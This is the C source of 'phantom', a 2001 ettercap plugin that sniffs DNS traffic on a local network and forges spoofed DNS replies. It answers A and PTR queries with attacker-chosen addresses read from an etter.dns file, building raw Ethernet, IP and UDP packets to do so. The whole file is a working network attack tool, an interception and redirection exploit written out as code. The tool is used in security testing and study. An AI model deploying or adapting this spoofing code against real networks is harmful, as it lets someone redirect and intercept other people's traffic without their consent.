/*
    phantom -- ettercap plugin -- spoof DNS requests

    Copyright (C) 2001  NaGoR

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.

    $Id: phantom.c,v 1.6 2001/12/20 20:09:45 alor Exp $
*/

#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/param.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/nameser.h>
#include <resolv.h>

#include "../../src/include/ec_main.h"
#include "../../src/include/ec_plugins.h"
#include "../../src/include/ec_inet_structures.h"
#include "../../src/include/ec_inet.h"
#include "../../src/include/ec_inet_forge.h"
#include "../../src/include/ec_error.h"
#include "../../src/include/ec_parser.h"
#include "../../src/include/ec_queue.h"


/*
 *                                     1  1  1  1  1  1
 *       0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5
 *     +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
 *     |                      ID                       |
 *     +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
 *     |QR|   Opcode  |AA|TC|RD|RA|   Z    |   RCODE   |
 *     +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
 *     |                    QDCOUNT                    |
 *     +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
 *     |                    ANCOUNT                    |
 *     +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
 *     |                    NSCOUNT                    |
 *     +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
 *     |                    ARCOUNT                    |
 *    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
 */


typedef struct
{
   u_short id;                // DNS packet ID
#ifdef WORDS_BIGENDIAN
   u_char  qr: 1;             // response flag
   u_char  opcode: 4;         // purpose of message
   u_char  aa: 1;             // authoritative answer
   u_char  tc: 1;             // truncated message
   u_char  rd: 1;             // recursion desired
   u_char  ra: 1;             // recursion available
   u_char  unused: 1;         // unused bits (MBZ as of 4.9.3a3)
   u_char  ad: 1;             // authentic data from named
   u_char  cd: 1;             // checking disabled by resolver
   u_char  rcode: 4;          // response code
#else // WORDS_LITTLEENDIAN
   u_char  rd: 1;             // recursion desired
   u_char  tc: 1;             // truncated message
   u_char  aa: 1;             // authoritative answer
   u_char  opcode: 4;         // purpose of message
   u_char  qr: 1;             // response flag
   u_char  rcode: 4;          // response code
   u_char  cd: 1;             // checking disabled by resolver
   u_char  ad: 1;             // authentic data from named
   u_char  unused: 1;         // unused bits (MBZ as of 4.9.3a3)
   u_char  ra: 1;             // recursion available
#endif
   u_short num_q;             // Number of questions
   u_short num_answer;        // Number of answer resource records
   u_short num_auth;          // Number of authority resource records
   u_short num_res;           // Number of additional resource records
} DNS_header;


#define DNS_HEADER   0xc      // DNS header:          12 bytes

// SLIST definition learned looking at dnsspoof.c (c) dugsong

struct dns_file_entry {
   char   *name;
   u_long ip;
   SLIST_ENTRY(dns_file_entry) next;
};

SLIST_HEAD(, dns_file_entry) dns_entries;


#define DNS_FILE "etter.dns"

// protos...

int Plugin_Init(void *);
int Plugin_Fini(void *);
void Parse_Packet(char *buf, int sock, char *MyMAC);
char * GetType(short t);
int Load_DNS_entries(void);
u_long dns_spoof_a(const char *name);
char * dns_spoof_ptr(const char *name);
int phantom(void *);

// plugin operation

struct plugin_ops ops = {
   ettercap_version: VERSION,
   plug_info:        "Sniff/Spoof DNS requests",
   plug_version:     15,
   plug_type:        PT_EXT,
   hook_point:       HOOK_NONE,
   hook_function:    &phantom,
};

//==================================

int Plugin_Init(void *params)
{
   return Plugin_Register(params, &ops);
}

int Plugin_Fini(void *params)
{
   return 0;
}

// =================================


char * GetType(short t)
{
   static char type[15];

   switch(t)
   {
      case T_A:
         sprintf(type, "A (%#x)", t);
         break;
      case T_PTR:
         sprintf(type, "PTR (%#x)", t);
         break;
      case T_CNAME:
         sprintf(type, "CNAME (%#x)", t);
         break;
      default:
         sprintf(type, " (%#x)", t);
         break;
   }

   return type;
}

u_long dns_spoof_a(const char *name)
{
   struct dns_file_entry *de;

   SLIST_FOREACH(de, &dns_entries, next)
   {
      if (match_pattern(name, de->name))
         return (de->ip);
   }
   return (-1);
}

char * dns_spoof_ptr(const char *name)
{
   struct dns_file_entry *de;
   int a0, a1, a2, a3;
   u_long ip;
   char *a;

   if (strchr(name, '%') != NULL)
      return (NULL);

   if (sscanf(name, "%d.%d.%d.%d.", &a3, &a2, &a1, &a0) != 4)
      return (NULL);

   a = (char *)&ip;

   a[0] = a0 & 0xff; a[1] = a1 & 0xff; a[2] = a2 & 0xff; a[3] = a3 & 0xff;

   SLIST_FOREACH(de, &dns_entries, next)
   {
      if (de->ip == ip && strchr(de->name, '*') == NULL)
         return (de->name);
   }
   return (NULL);
}



void Parse_Packet(char *buf, int sock, char *MyMAC)
{

   ETH_header *eth;
   IP_header  *ip;
   UDP_header *udp;
   DNS_header *dns;
   char *data, *end;
   int datalen;
   char name[MAXDNAME];
   int name_len;
   short t, c;
   char type[6];
   char *q, *p;


   eth = (ETH_header *) buf;
   if (eth->type == htons(ETH_P_IP))
   {
      ip = (IP_header *)(eth+1);
      if ( ip->proto == IPPROTO_UDP)
      {
         udp = (UDP_header *) ((int)ip + ip->h_len * 4);
         if (ntohs(udp->dest) == 53 || ntohs(udp->source) == 53)  // only packets directed to domain server
         {
            dns = (DNS_header *)((int)udp + UDP_HEADER);
            data = (char *) (dns +1);
            end = (char *)udp + (udp->len) - UDP_HEADER;

            memset(name, 0, sizeof(name));
            memset(type, 0, sizeof(type));

            Plugin_Output("DNS activity [%s:%d] --> ", int_ntoa(ip->source_ip), ntohs(udp->source));
            Plugin_Output("[%s:%d]\n", int_ntoa(ip->dest_ip), ntohs(udp->dest) );

            if ((name_len = dn_expand((u_char *)dns, end, data, name, sizeof(name))) < 0)
               return;

            q = data + name_len;

            GETSHORT(t, q);
            GETSHORT(c, q);

            if (c != C_IN) return;

            if ( dns->opcode == QUERY && htons(dns->num_q) == 1 && htons(dns->num_answer) == 0)
            {
               Plugin_Output("%12s [%s] %10s  ID: %#x\n\n", "query", name, GetType(t), ntohs(dns->id));
               q = (char *)udp + ntohs(udp->len);

               if (t == T_A)
               {
                  u_long dst;

                  if ((dst = dns_spoof_a(name)) == -1) return;
                  memcpy(q, "\xc0\x0c", 2);              // compressed name offset
                  memcpy(q + 2, "\x00\x01", 2);          // type A
                  memcpy(q + 4, "\x00\x01", 2);          // class
                  memcpy(q + 6, "\x00\x00\x0e\x10", 4);  // TTL
                  memcpy(q + 10, "\x00\x04", 2);         // datalen
                  memcpy(q + 12, &dst, sizeof(dst));     // data

                  datalen = ntohs(udp->len) - UDP_HEADER + 16;

                  Inet_Forge_ethernet(buf, MyMAC, eth->source_mac, ETH_P_IP);
                  Inet_Forge_ip(buf + ETH_HEADER, ip->dest_ip, ip->source_ip, ntohs(ip->t_len)-IP_HEADER+16, ntohs(ip->ident)+1, ip->frag_and_flags, IPPROTO_UDP);

                  dns->qr = dns->ra = 1;
                  dns->num_answer = htons(1);

                  udp->source ^= udp->dest ^= udp->source ^= udp->dest;    // dirty trick ;)  swap the source and dest
                  udp->len = htons(datalen + UDP_HEADER);
                  udp->checksum = 0;
                  udp->checksum = Inet_Forge_Checksum( (u_short *)udp, IPPROTO_UDP, UDP_HEADER+datalen, ip->source_ip, ip->dest_ip );

                  Inet_SendRawPacket(sock, buf, ETH_HEADER + IP_HEADER + UDP_HEADER + datalen );

                  Plugin_Output("    SPOOFING [%s:%d] --> ", int_ntoa(ip->source_ip), ntohs(udp->source));
                  Plugin_Output("[%s:%d]\n", int_ntoa(ip->dest_ip), ntohs(udp->dest) );
                  Plugin_Output("%12s %11s [%s] -> [%s]\n\n", "->", "A (0x1)", name, int_ntoa(dst));

               }
               else if (t == T_PTR)
               {
                  int rlen;
                  if ((p = dns_spoof_ptr(name)) == NULL) return;
                  memcpy(q, "\xc0\x0c", 2);              // compressed name offset
                  memcpy(q + 2, "\x00\x0c", 2);          // type PTR
                  memcpy(q + 4, "\x00\x01", 2);          // class
                  memcpy(q + 6, "\x00\x00\x0e\x10", 4);  // TTL
                  rlen = dn_comp(p, q + 12, 256, NULL, NULL);
                  q += 10;
                  PUTSHORT(rlen, q);

                  datalen = ntohs(udp->len) - UDP_HEADER + 12 + rlen;

                  Inet_Forge_ethernet(buf, MyMAC, eth->source_mac, ETH_P_IP);
                  Inet_Forge_ip(buf + ETH_HEADER, ip->dest_ip, ip->source_ip, ntohs(ip->t_len)-IP_HEADER+12+rlen, ntohs(ip->ident)+1, ip->frag_and_flags, IPPROTO_UDP);

                  dns->qr = dns->ra = 1;
                  dns->aa = 1;
                  dns->num_answer = htons(1);

                  udp->source ^= udp->dest ^= udp->source ^= udp->dest;    // dirty trick ;)  swap the source and dest
                  udp->len = htons(datalen + UDP_HEADER);
                  udp->checksum = 0;
                  udp->checksum = Inet_Forge_Checksum( (u_short *)udp, IPPROTO_UDP, UDP_HEADER+datalen, ip->source_ip, ip->dest_ip );

                  Inet_SendRawPacket(sock, buf, ETH_HEADER + IP_HEADER + UDP_HEADER + datalen );

                  Plugin_Output("    SPOOFING [%s:%d] --> ", int_ntoa(ip->source_ip), ntohs(udp->source));
                  Plugin_Output("[%s:%d]\n", int_ntoa(ip->dest_ip), ntohs(udp->dest) );
                  Plugin_Output("%12s %11s [%s] -> [%s]\n\n", "->", "PTR (0xc)", name, p);

               }
               else return;

            }
            else if ( dns->rcode == NOERROR && dns-> qr && htons(dns->num_answer) > 0) // ANSWER
            {
               int i;
               u_long TTL;
               short a_datalen;
               u_long IP;

               Plugin_Output("%12s [%s] %10s  ID: %#x\n", "answer", name, GetType(t), ntohs(dns->id));

               for (i=0; i<= ntohs(dns->num_answer); i++)
               {
                  if ((name_len = dn_expand((u_char *)dns, end, q, name, sizeof(name))) < 0)
                     return;

                  q += name_len;

                  GETSHORT(t, q);
                  GETSHORT(c, q);
                  GETLONG(TTL, q);
                  GETSHORT(a_datalen, q);

                  if (c != C_IN) return;
                  if (t != T_A && t != T_CNAME && t != T_PTR)
                  {
                     Plugin_Output("\n");
                     return;
                  }

                  Plugin_Output("%12s %11s [%s] -> ", "->", GetType(t), name);
                  if (t == T_A )
                  {
                     GETLONG(IP, q);
                     IP = htonl(IP);
                     Plugin_Output("[%s]\n", int_ntoa(IP) );
                  }
                  else if (t == T_CNAME || t == T_PTR)
                  {
                     name_len = dn_expand((u_char *)dns, end, q, name, sizeof(name));
                     q += a_datalen;
                     Plugin_Output("[%s]\n", name);
                  }

               }
               Plugin_Output("\n");
            }
         }
      }
   }
}




int phantom(void *dummy)
{
   int sock, MTU, len=0;
   char MyMAC[6];
   char c[2] = "";
   char *buf;

   if (Load_DNS_entries() == 1) //there was an error
   {
      Plugin_Output("\n");
      return 0;
   }

   sock = Inet_OpenRawSock(Options.netiface);
   Inet_GetIfaceInfo(Options.netiface, &MTU, MyMAC, NULL, NULL);

   if (Options.normal)
      Inet_SetPromisc(Options.netiface);  // promisc come on command line
   else
   {
      if (number_of_connections == -1) // not in a sniffing mode
      {
         Plugin_Output("\nWARNING: This plugin must be executed within a sniffing method or you\n");
         Plugin_Output("         will see only your DNS request...\n");
      }
   }

   buf = Inet_Forge_packet(MTU);
   fcntl(sock, F_SETFL, O_NONBLOCK);

   Plugin_Output(" NOTE: keep in mind that virtual host can't be redirected.\n");
   Plugin_Output("       you have to set up a filter which replaces the \"Host:\" directive\n");
   Plugin_Output("       in the HTTP header request\n\n");

   Plugin_Output("DNS spoofing... (press return to stop)\n\n");


   loop
   {
      len = Inet_GetRawPacket(sock, buf, MTU, NULL);

      if (Plugin_Input(c, 1, P_NONBLOCK))
      {
         Inet_Forge_packet_destroy( buf );
         Inet_CloseRawSock(sock);
         return 0;
      }

      if (len > 0) Parse_Packet(buf, sock, MyMAC);
      else         usleep(1500);
   }

}




int Load_DNS_entries(void)
{
   char line[1024];
   char *ip, *name, *ptr;
   struct dns_file_entry *dnsent;
   FILE *fto;
   int i=0;

   fto = fopen( "./" DNS_FILE, "r");
   if (fto == NULL)
   {
      fto = fopen( DATA_PATH "/" DNS_FILE, "r");
      if (fto == NULL)
      {
         Plugin_Output("\nCan't find " DNS_FILE " in ./ or " DATA_PATH);
         return 1;
      }
      else
         Plugin_Output("\nLoading DNS entries from " DATA_PATH "/" DNS_FILE "...\n\n");
   }
   else
      Plugin_Output("\nLoading DNS entries from ./" DNS_FILE "...\n\n");

   SLIST_INIT(&dns_entries);

   do
   {
      fgets(line, 1024, fto);
      i++;

      if ( (ptr = strchr(line, '#')) )
         *ptr = 0;

      if (!strlen(line))   // skip 0 length line
         continue;

      if ((ip = strtok(line, "\t ")) == NULL || (name = strtok(NULL, "\n\t ")) == NULL)
         continue;

      dnsent = (struct dns_file_entry *)calloc(1, sizeof(struct dns_file_entry));
      if (dnsent == NULL)
         Error_msg("phantom:%d calloc() | ERRNO : %d | %s", __LINE__, errno, strerror(errno));

      if (inet_aton(ip, (struct in_addr *)&dnsent->ip) == 0)
      {
         Plugin_Output("Invalid entry on line #%d -> [%s]", i, line );
         return 1;
      }

      dnsent->name = strdup(name);

      SLIST_INSERT_HEAD (&dns_entries, dnsent, next);

   } while (!feof(fto));

   fclose(fto);
   return 0;

}


/* EOF */
